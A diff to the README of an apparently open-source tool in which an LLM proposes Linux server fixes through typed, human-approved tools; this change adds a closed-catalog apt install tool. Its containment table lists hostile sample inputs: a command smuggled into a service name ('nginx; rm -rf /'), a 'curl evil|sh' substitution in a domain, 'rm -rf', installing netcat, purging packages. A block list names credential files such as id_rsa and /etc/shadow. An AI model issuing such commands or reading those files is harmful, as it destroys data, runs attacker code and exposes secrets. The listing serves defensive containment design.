@@ -10,9 +10,11 @@
 [![Shell tools](https://img.shields.io/badge/shell%20tools-0-red)](SECURITY.md)
 [![Destructive tools](https://img.shields.io/badge/destructive%20tools-0-red)](SECURITY.md)
 [![Telemetry](https://img.shields.io/badge/telemetry-none-success)](SECURITY.md)
-[![Adversarial tests](https://img.shields.io/badge/adversarial%20prompts-32%20blocked-success)](tests/adversarial/)
+[![Adversarial tests](https://img.shields.io/badge/adversarial%20prompts-38%20blocked-success)](tests/adversarial/)
+[![Package catalog](https://img.shields.io/badge/installs-12%20catalog%20keys%20%C2%B7%20apt%20only-blue)](docs/INSTALLING_SOFTWARE.md)
 
 *Type plain English. Get a diagnosis with evidence. Approve the fix with one keystroke.*<br>
+*Say "install redis". See the exact `apt-get` line. Approve it. Nothing else can be installed.*<br>
 *The LLM decides **intent**. The OS and the policy engine decide **capability**.*
 
 </div>
@@ -64,7 +66,7 @@ flowchart LR
     P -->|"read"| R["🟢 runs freely"]
     P -->|"write / admin"| A["🟡 Proposed action<br/>exact command shown"]
     A --> H{"🙋 Approve?<br/>y / N / explain"}
-    H -->|"y"| X["⚙️ executor runs it<br/>SIGTERM only · guarded SQL · 6 sudo rules"]
+    H -->|"y"| X["⚙️ executor runs it<br/>SIGTERM only · guarded SQL · exact sudo rules"]
     H -->|"N"| D["🚫 nothing happens"]
     P -->|"destructive"| N["❌ does not exist"]
     R --> O["🧾 hash-chained audit"]
@@ -109,13 +111,15 @@ bastion ask "what's using the most CPU?"
 |---|:-:|:-:|---|
 | 📊 `load_avg` `memory` `disk_usage` `top_processes` `process_detail` `io_top` `connections` | 🟢 read | – | `/proc`, `psutil`, `ss -s` |
 | 🔧 `service_status` `service_logs` | 🟢 read | – | `systemctl is-active/show`, `journalctl -u <svc> -n <lines>` |
+| 📦 `package_status(package)` | 🟢 read | – | `dpkg-query -W` for the catalog entry's apt packages |
 | 🌐 `nginx_test` | 🟢 read | – | `sudo nginx -t` |
 | 🐘 `db_active_queries` `db_locks` | 🟢 read | – | `pg_stat_activity` metadata + query text, **never rows** |
-| 🔁 `restart_service(nginx\|gunicorn\|celery\|postgresql)` | 🟡 write | ✋ yes | `sudo systemctl restart <svc>` |
+| 🔁 `restart_service(nginx\|gunicorn\|celery\|postgresql\|apache2\|mysql\|mariadb\|redis-server\|memcached)` | 🟡 write | ✋ yes | `sudo systemctl restart <svc>` |
 | 🔒 `install_ssl(domain)` `renew_ssl` | 🟡 write | ✋ yes | `sudo certbot --nginx -d <domain> …`, `sudo certbot renew` |
 | 🐘 `db_cancel_query(pid)` | 🟡 write | ✋ yes | `pg_cancel_backend` with guards **baked into the SQL** |
 | 🎯 `kill_process(pid)` | 🟡 write | ✋ yes | SIGTERM only, protected-process list |
 | 🐘 `db_terminate_query(pid)` | 🔴 admin | ✋ yes | `pg_terminate_backend` with guards baked into the SQL |
+| 📦 `install_package(nginx\|apache\|php\|python\|django\|nodejs\|mysql\|mariadb\|postgresql\|redis\|memcached\|certbot)` | 🔴 admin | ✋ yes | `sudo systemd-run --wait … apt-get update`, then `… apt-get install -y <fixed list>` — [details](docs/INSTALLING_SOFTWARE.md) |
 | 🙋 `ask_user(question)` | virtual | – | asks *you* instead of guessing |
 
 Full reference with every exact plan string: [docs/TOOLS.md](docs/TOOLS.md) (generated from the registry, CI fails if stale).
@@ -130,6 +134,7 @@ Full reference with every exact plan string: [docs/TOOLS.md](docs/TOOLS.md) (gen
 | 🐘 `DROP`, `TRUNCATE`, `DELETE`, read table rows | Four fixed statements against `pg_stat_activity`; `%s` params, never string interpolation |
 | 🔌 Terminate replication or non-client backends | The `WHERE` clause refuses them before the model ever sees the SQL |
 | 🔑 Read `.env*` `*.pem` `*.key` `id_rsa*` `/etc/shadow` `/etc/sudoers*` | There is no file-reading tool at all |
+| 📦 Remove/purge a package, install anything outside the catalog, pin a version, add a PPA, `pip install` | `install_package` takes one closed-enum key; each sudoers line is a literal `apt-get install -y <fixed list>`; there is no remove rule and no remove tool |
 | 🤫 Run a write without a human | `/run` demands the SHA-256 of the plan the CLI displayed; `--dry-run` never sends it |
 | 📡 Phone home | Only your LLM provider and your executor; zero telemetry |
 
@@ -202,7 +207,7 @@ $ bastion ask "kill pid 1, it's hogging memory"
 </td></tr>
 </table>
 
-> 🐕‍🦺 **"This is fine."** — the executor, sitting in a `ProtectSystem=strict` sandbox with six sudo rules,
+> 🐕‍🦺 **"This is fine."** — the executor, sitting in a `ProtectSystem=strict` sandbox with a sudoers file of literal commands,
 > while the model confidently asks for a shell it will never get.
 
 <div align="center">
@@ -210,7 +215,9 @@ $ bastion ask "kill pid 1, it's hogging memory"
 | 😱 LLM proposes | 🛡️ What happens |
 |---|---|
 | `rm -rf /tmp/*` | there is no tool for that |
-| `restart_service("nginx; rm -rf /")` | 422: not one of `nginx, gunicorn, celery, postgresql` |
+| `restart_service("nginx; rm -rf /")` | 422: not one of the nine services in the enum |
+| `install_package("netcat")` · `install_package("nginx", extra="--allow-unauthenticated")` | 422: not a catalog key · extra field forbidden |
+| `remove_package("postgresql")` · `apt("purge -y postgresql")` | there is no tool for that, and no sudo rule either |
 | `install_ssl("$(curl evil\|sh).example.com")` | 422: `^[a-z0-9.-]+$` |
 | `kill_process(pid=960, signal=9)` | 422: extra field `signal` forbidden |
 | `db_terminate_query(12)` on the walsender | 403: the `WHERE` clause filtered it out |
@@ -263,14 +270,15 @@ flowchart TB
     subgraph Server["🖥️ server · 127.0.0.1:8710 · user bastion (nologin)"]
         API["FastAPI executor<br/>tokens · roles · policy"]
         VAL["pydantic validation<br/>+ guards (pid, domain, protected list)"]
-        TOOLS["18 typed tools<br/>list-form subprocess · psutil · psycopg"]
+        TOOLS["21 typed tools<br/>list-form subprocess · psutil · psycopg"]
         RED["redaction"]
         AUD["hash-chained audit.jsonl"]
         API --> VAL --> TOOLS --> RED --> AUD
     end
     LOOP -- "ssh -L tunnel" --> API
     PROV -- "HTTPS" --> LLMAPI["☁️ LLM API<br/><i>query text + redacted, fenced output only</i>"]
-    TOOLS -- "sudoers: 6 exact commands<br/>CAP_KILL · ProtectSystem=strict" --> OS["🐧 Linux"]
+    TOOLS -- "sudoers: 25 literal commands<br/>CAP_KILL · ProtectSystem=strict" --> OS["🐧 Linux"]
+    TOOLS -- "systemd-run --wait<br/>(apt, outside the sandbox)" --> OS
 ```
 
 Tool output is redacted (emails, tokens, keys, card/PAN/Aadhaar-like numbers) and wrapped in
@@ -292,6 +300,34 @@ The system prompt makes the model climb this ladder one rung at a time and verif
 
 ---
 
+## 📦 Install a stack (nginx, Apache, PHP, Django, MySQL, PostgreSQL, Redis, …)
+
+```
+$ bastion ask "install postgresql and redis"
+• package_status  package=postgresql  ✔ summary: missing postgresql postgresql-contrib  (0.1s)
+╭─────────────────────────── Proposed action ───────────────────────────╮
+│ sudo systemd-run --wait --pipe --collect --quiet … apt-get update -q  │
+│ sudo systemd-run --wait --pipe --collect --quiet …                    │
+│   apt-get install -y postgresql postgresql-contrib                    │
+╰─────────────────────────────────── risk: ADMIN · needs approval ──────╯
+Approve? [y/N/explain] (n): y
+• install_package  package=postgresql  ✔ summary: all installed  (58.2s)
+✔ package_status: missing postgresql postgresql-contrib → all installed
+• service_status  service=postgresql  ✔ is-active: active  (0.1s)
+```
+
+One request, one approval per package, and the exact `apt-get` line on screen before anything runs.
+
+- **Closed catalog.** `nginx` `apache` `php` `python` `django` `nodejs` `mysql` `mariadb` `postgresql` `redis` `memcached` `certbot` — each key maps to a fixed apt package list in code. No version, no PPA, no `pip`.
+- **Admin-only.** `install_package` is `risk: admin`: the executor must list `admin` in `enabled_risks` and the token must be an admin. Everyone else gets `package_status` (read) only.
+- **Install-only.** There is no remove/purge tool and no sudoers rule for one; the adversarial suite proves every `systemd-run` argv that reaches sudo is one of the catalog's exact install lines.
+- **Outside the sandbox, on purpose.** The executor is `ProtectSystem=strict`, so apt runs in a transient unit via `systemd-run --wait --pipe` — the sandbox is never widened.
+- **Then manageable.** Every unit the catalog installs (`apache2`, `mysql`, `mariadb`, `redis-server`, `memcached`, …) is in the service enum for `service_status` / `service_logs` / `restart_service`.
+
+Full guide, catalog table, and the sudoers mechanics: [docs/INSTALLING_SOFTWARE.md](docs/INSTALLING_SOFTWARE.md).
+
+---
+
 ## 🤖 Providers
 
 | Provider | Default model | Key | Notes |
@@ -307,11 +343,12 @@ All three talk plain HTTPS through `httpx`; there are no provider SDKs and no te
 | | |
 |---|---|
 | 🔢 Security invariants enforced in code, tests, and CI | **13** ([SECURITY.md](SECURITY.md)) |
-| 🧪 Tests (offline, recorded LLM fixtures) | **287** |
-| 😈 Adversarial scenarios with an operator who approves *everything* | **32**, all contained |
+| 🧪 Tests (offline, recorded LLM fixtures) | **335** |
+| 😈 Adversarial scenarios with an operator who approves *everything* | **38**, all contained |
 | 🐚 Shell tools | **0** |
 | 💣 Destructive tools | **0** |
-| 🔑 sudo rules | **6**, exact commands, regex-bound arguments |
+| 🔑 sudo rules | **25** literal commands (13 of them the generated apt catalog), regex-bound certbot domain, no wildcards |
+| 📦 Installable software | **12** catalog keys, apt only, install-only, admin-only |
 | 📦 Runtime dependencies | **6** (typer, rich, pydantic, httpx, pyyaml, psutil) |
 | 📡 Telemetry endpoints | **0** |
 
@@ -319,13 +356,14 @@ Risk table with mitigations: [docs/THREAT_MODEL.md](docs/THREAT_MODEL.md). Every
 
 ## 🗺️ Roadmap
 
-- **v0.2** — `redis`, `docker ps/logs` read tools; per-server tool allow-lists in the CLI config.
+- **v0.2** — `redis-cli info`, `docker ps/logs` read tools; per-server tool allow-lists in the CLI config.
+- **Catalog** — more apt-only entries (haproxy, rabbitmq, …) as people ask; never a free-text package name.
 - **v0.3** — multi-server incidents (`--server all`), Slack approval relay.
 - **Always** — more read tools. Never a shell.
 
 ## 🤝 Contributing
 
-Read [CONTRIBUTING.md](CONTRIBUTING.md). Adding a tool is a decorator, a sudoers line, a test, and a docs regen.
+Read [CONTRIBUTING.md](CONTRIBUTING.md). Adding a tool is a decorator, a sudoers line, a test, and a docs regen; adding a catalog entry is one tuple and a regenerated sudoers block.
 PRs that add shell access or destructive tools are rejected by policy, not by mood.
 
 ## 📄 License
